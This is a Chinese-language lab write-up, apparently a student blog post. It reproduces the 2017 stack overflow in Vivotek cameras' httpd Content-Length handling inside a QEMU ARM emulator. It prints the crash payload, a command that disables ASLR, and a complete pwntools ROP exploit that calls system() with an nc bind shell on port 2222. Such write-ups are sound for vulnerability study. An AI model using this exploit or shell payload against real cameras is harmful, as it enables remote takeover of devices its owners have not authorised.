---
layout: post
title:  "2019.5.14 Vivotek smart camera stackoverflow vuln recurrence"
tags: [iot, stack, overflow, revuln]
date: 2019-05-14
comments: false
---

# Vivotek智能摄像头远程栈溢出漏洞分析与复现

## 前言

最近物联网课程要结课，分组演讲ppt，想了想主题，最后想到iot安全这一块。恰巧自己也想找点真实的漏洞调试一下。找了一下选了一个比较简单的栈溢出开始复现，参考了几篇文章会贴在后面，但这个过程中也是踩了不少坑，花了一晚上才调好。于是便有了这篇文章算总结一下。

## 漏洞简述

2017年11月披露的vivotek的一个栈溢出漏洞，漏洞发生在其固件中的httpd服务，其未对用户post的数据长度做校验，导致攻击者可以发送特定的数据使摄像头进程崩溃，甚至任意代码执行。   

作者[poc](https://www.exploit-db.com/exploits/44001)

影响版本:

```
CC8160 CC8370-HV CC8371-HV CD8371-HNTV CD8371-HNVF2 FD8166A
FD8166A-N FD8167A FD8167A-S FD8169A FD8169A-S FD816BA-HF2
FD816BA-HT FD816CA-HF2 FD8177-H FD8179-H FD8182-F1 FD8182-F2
FD8182-T FD8366-V FD8367A-V FD8369A-V FD836BA-EHTV FD836BA-EHVF2
FD836BA-HTV FD836BA-HVF2 FD8377-HV FD8379-HV FD8382-ETV FD8382-EVF2
FD8382-TV FD8382-VF2 FD9171-HT FD9181-HT FD9371-EHTV FD9371-HTV
FD9381-EHTV FD9381-HTV FE8182 FE9181-H FE9182-H FE9191
FE9381-EHV FE9382-EHV FE9391-EV IB8360 IB8360-W IB8367A
IB8369A IB836BA-EHF3 IB836BA-EHT IB836BA-HF3 IB836BA-HT IB8377-H
IB8379-H IB8382-EF3 IB8382-ET IB8382-F3 IB8382-T IB9371-EHT
IB9371-HT IB9381-EHT IB9381-HT IP8160 IP8160-W IP8166
IP9171-HP IP9181-H IZ9361-EH MD8563-EHF2 MD8563-EHF4 MD8563-HF2
MD8563-HF4 MD8564-EH MD8565-N SD9161-H SD9361-EHL SD9362-EH
SD9362-EHL SD9363-EHL SD9364-EH SD9364-EHL SD9365-EHL SD9366-EH
SD9366-EHL VS8100-V2
```

## 调试环境搭建

### 下载固件

本次调试所用的固件可以在[这里](https://github.com/mcw0/PoC/files/3128058/CC8160-VVTK-0100d.flash.zip)下载

解压，使用`binwalk`分离固件

![5cdae79c8e74579004](https://i.loli.net/2019/05/15/5cdae79c8e74579004.png)

漏洞出现在httpd服务上，先查看对应文件

![5cdae821d657a77842](https://i.loli.net/2019/05/15/5cdae821d657a77842.png)

可以看到ARM架构，32位小端序，保护只开了NX。

现在跑一下试试：

先挂载所需目录，并将qemu-arm-static拷贝到对应根目录下:

```
sudo mount -o bind /dev ./dev
sudo mount -t proc /proc ./proc
cp $(whereis qemu-arm-static) .
```

![5cdae8e202cd196923](https://i.loli.net/2019/05/15/5cdae8e202cd196923.png)

尝试运行:

```
sudo chroot . ./qemu-arm-static ./usr/sbin/httpd
```

发现报错:Could not open boa.conf for reading.

![5cdae9ac31ec854953](https://i.loli.net/2019/05/15/5cdae9ac31ec854953.png)

### 运行环境修复

在ida中根据字符串交叉引用可以找到报错位置：

![5cdaeb91a39fd38470](https://i.loli.net/2019/05/15/5cdaeb91a39fd38470.png)

无法读取/etc/conf.d/boa/boa.conf

文件缺失，缺失的那部分文件在根目录defconf里面，将其解压并分离出来。

![5cdaea4b15d1857642](https://i.loli.net/2019/05/15/5cdaea4b15d1857642.png)

![5cdaea64685af71452](https://i.loli.net/2019/05/15/5cdaea64685af71452.png)

将其中所有文件拷贝至`squash-root/mnt/flash/etc`下即可:

![5cdaeab14be0561259](https://i.loli.net/2019/05/15/5cdaeab14be0561259.png)

再次运行，boa.conf正常读取到了，但查看相应程序，并没有httpd运行。

![5cdaeb0fe633d98754](https://i.loli.net/2019/05/15/5cdaeb0fe633d98754.png)

![5cdaeb6405bb622022](https://i.loli.net/2019/05/15/5cdaeb6405bb622022.png)

根据报错信息在ida中溯源。

![5cdaebe50b64810941](https://i.loli.net/2019/05/15/5cdaebe50b64810941.png)

![5cdaebf565a8783202](https://i.loli.net/2019/05/15/5cdaebf565a8783202.png)

![5cdaebfda525654157](https://i.loli.net/2019/05/15/5cdaebfda525654157.png)

`F5`

![5cdaec7946da159431](https://i.loli.net/2019/05/15/5cdaec7946da159431.png)

调用了两个库函数，这两个函数的作用分别是gethostname()：返回本地主机的标准主机名，如果函数成功，则返回 0。如果发生错误则返回 -1。gethostbyname()：用域名或主机名获取IP地址。这里要求两个函数读到的文件内容相同，它们对应文件系统中的；

![5cdaed29866d134674](https://i.loli.net/2019/05/15/5cdaed29866d134674.png)

这里我把它们都修改为`127.0.0.1 localhost`，再次尝试运行发现成功。

![5cdaed615c49165034](https://i.loli.net/2019/05/15/5cdaed615c49165034.png)

![5cdaed6aa6b7696773](https://i.loli.net/2019/05/15/5cdaed6aa6b7696773.png)

### 简单的漏洞测试

直接使用作者的payload:

```
echo -en "POST /cgi-bin/admin/upgrade.cgi 
HTTP/1.0\nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n"  | ncat -v 127.0.0.1 80
```

![5cdaedf365b3a92201](https://i.loli.net/2019/05/15/5cdaedf365b3a92201.png)

发现服务已经崩溃。造成了dos攻击。

但这个payload仅仅只能达到让服务宕机的效果，并不能获得目标机器的控制权限，为了达到这个目的，还需要深入研究。

## 漏洞研究和更好的利用

要想定位溢出点就要调试，确定程序crash时的寄存器情况 栈布局等。

如果仅仅使用`sudo chroot . ./qemu-arm-static ./usr/sbin/httpd`

然后在本地gdb attach上去的话，gdb没法将程序的架构正确的识别为arm，从而导致寄存器信息都是乱的(当作x86来处理)。

### 搭建 ARM QEMU 虚拟机环境

因此需要一个虚拟机，这里采用qemu来架设一个arm-debian虚拟机:

qemu的安装就不再多说了。

从 Debian[官网](https://people.debian.org/~aurel32/qemu/armhf/)下载 QEMU 需要的 Debian ARM 系统的三个文件:

1. debian_wheezy_armhf_standard.qcow2 2013-12-17 00:04 229M

2. initrd.img-3.2.0-4-vexpress 2013-12-17 01:57 2.2M

3. vmlinuz-3.2.0-4-vexpress 2013-09-20 18:33 1.9M

![5cdaeffc4eab472792](https://i.loli.net/2019/05/15/5cdaeffc4eab472792.png)

在这个目录下执行下面三个命令:

```
sudo tunctl -t tap0 -u `whoami`  # 添加一个虚拟网卡
sudo ifconfig tap0 10.10.10.1/24 # 为添加的虚拟网卡配置 IP 地址
qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append "root=/dev/mmcblk0p2 console=ttyAMA0" -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic
```

![5cdaf046868cf73591](https://i.loli.net/2019/05/15/5cdaf046868cf73591.png)

稍等一会虚拟机就启动完成，默认用户名/密码:`root/root`

![5cdaf0a4a833e34368](https://i.loli.net/2019/05/15/5cdaf0a4a833e34368.png)

在宿主机将对应文件打包，并使用SimpleHTTPServer架设一个web用来传输文件。

![5cdaf1715ed9356898](https://i.loli.net/2019/05/15/5cdaf1715ed9356898.png)

接下来，在qemu虚拟机中手动配置ip地址,下载文件

```
ifconfig eth0 10.10.10.2
wget http://10.10.10.1/filename
```

![5cdaf1a591d2b64605](https://i.loli.net/2019/05/15/5cdaf1a591d2b64605.png)

解压，手动挂载目录。

```
tar -xvf filename
mount -o bind /dev ./squashfs-root
mount -t proc /proc ./squashfs-root
```

![5cdaf2099ceb164912](https://i.loli.net/2019/05/15/5cdaf2099ceb164912.png)

同样的 修复运行环境(都改为127.0.0.1 localhost)：

![5cdaf277e4ec172518](https://i.loli.net/2019/05/15/5cdaf277e4ec172518.png)

以squashfs-root为根目录打开一个shell:

```
chroot squashfs-root sh
```

![5cdaf2b9c675e18549](https://i.loli.net/2019/05/15/5cdaf2b9c675e18549.png)

运行程序，成功

```
/usr/sbin/httpd
```

![5cdaf2fa5273677617](https://i.loli.net/2019/05/15/5cdaf2fa5273677617.png)

用之前的payload测试，成功

![5cdaf328c3bb535237](https://i.loli.net/2019/05/15/5cdaf328c3bb535237.png)

### 配置调试环境

为了方便调试，使用[gdbserver-7.7.1-armel-eabi5-v1-sysv](https://github.com/mzpqnxow/gdb-static-cross/blob/master/prebuilt-static/unstripped/gdbserver-7.7.1-armel-eabi5-v1-sysv "gdbserver-7.7.1-armel-eabi5-v1-sysv")，同样使用simplehttp传输到虚拟机中。

运行httpd并使用gdbserver attach

![5cdaf3f87d6cc45700](https://i.loli.net/2019/05/15/5cdaf3f87d6cc45700.png)

这样虚拟机的环境就配好了，等待调试。

在宿主机安装gdb-mulitiarch

`sudo apt install gdb-mulitiarch`

运行，设置架构，设置远程调试地址，可以正常attach到server上去。

```
set architecture armv2
target remote 10.10.10.2:1234
c
```

![5cdaf4421a85019133](https://i.loli.net/2019/05/15/5cdaf4421a85019133.png)

再次使用payload攻击httpd：

![5cdaf4a5ab99894358](https://s2.ax1x.com/2019/05/16/E7OKO0.png)

![5cdaf4ac1c71a47504](https://i.loli.net/2019/05/15/5cdaf4ac1c71a47504.png)

可以看到crash时各个寄存器的值和栈情况。

可以看到寄存器被覆写为输入值，pc寄存器指向不存在的地址，程序crash.

现在去IDA中找一下漏洞点

### 寻找漏洞触发点

通过交叉引用定位到content-length处发现栈溢出

![5cdaf54f04a8d55674](https://i.loli.net/2019/05/15/5cdaf54f04a8d55674.png)

![5cdaf56a0b4d132491](https://i.loli.net/2019/05/15/5cdaf56a0b4d132491.png)

dest缓冲区距栈底只有0x38字节，可以被输入值溢出从而影响pc从而控制执行流。

但是这里开了NX，考虑ret2libc，就要先泄露libc，更好的情况是不用泄露，libc基址固定。但前提是vivotek实体机上没有开aslr。

### 编写exp攻击

这里先关闭aslr。

```
echo 0 > /proc/sys/kernel/randomize_va_space
```

查看地址情况：

![5cdaf6115cb0166979](https://s2.ax1x.com/2019/05/16/E7OQmV.png)

可以看到调用的libc和其固定基址。

接下来做简单的arm rop即可。

目的是执行system('/bin/sh')，根据arm传参规则，只需控制r0中存放'/bin/sh'地址，控制pc指向system地址即可。

使用ROPgadget寻找gadget.

![5cdaf6ad399c873941](https://i.loli.net/2019/05/15/5cdaf6ad399c873941.png)

![5cdaf6c26ab5575945](https://i.loli.net/2019/05/15/5cdaf6c26ab5575945.png)

可以发现一个直接pop r0的gadget，但是里面有坏字符`\x00`,会导致程序读取截止从而失败。

再找一下其他的gadgets

![5cdaf72f8634a88343](https://i.loli.net/2019/05/15/5cdaf72f8634a88343.png)

这里可以先把地址pop到r1中，再通过mov r0,r1赋给r0

因此使用这两个gadget即可:

```
0x00048784 : pop {r1, pc} 
0x00016aa4 : mov r0, r1 ; pop {r4, r5, pc}
```

exploit:

```python
#!/usr/bin/python

from pwn import *
import os

libc_base = 0x76f2d000 #libcbase

stack_base = 0x7effeb60 #stack addr

libc_elf = ELF('libuClibc-0.9.33.3-git.so')

payload = (0x38 - 4) * 'a'


payload +=  p32(0x00048784 + libc_base)

success('gad1:'+hex(0x00048784 + libc_base))

payload += p32(0x80 + stack_base)

success('gad2:'+hex(0x80 + stack_base))

payload += p32(0x00016aa4 + libc_base)

success('gad3:'+hex(0x00016aa4 + libc_base))

payload += (0x8 * 'a')  # padding

payload += p32(libc_elf.symbols['system'] + libc_base)

success('gad4:'+hex(1995918000))

payload += ('le3d1ng;' * 0x50 + 'nc\x20-lp2222\x20-e/bin/sh\x20>') # slide to binsh


print len(payload)
#exit()
payload = 'echo "POST /cgi-bin/admin/upgrade.cgi \nHTTP/1.0\nContent-Length:{}\n\r\n\r\n"  | nc -v 10.10.10.2 80'.format(payload)
os.system(payload)
print payload
```

测试一下：

![5cdaf845ec7e175565](https://i.loli.net/2019/05/15/5cdaf845ec7e175565.png)

打过去之后目标成功监听2222端口，nc过去即可getshell

---

5.16后记:  
  
  可以使用qemu + rinetd + armlinuxserver + IDA 来动态调试arm程序
  修复armlinuxserver运行库环境可以使用 `ln -s  /lib/ld-linux-armhf.so.3  /lib/ld-linux.so.3` , [参考](https://bbs.pediy.com/thread-224337.htm)  
  

---

ref:

https://paper.seebug.org/480/#_4

https://paper.seebug.org/879/

https://xz.aliyun.com/t/5054#toc-8
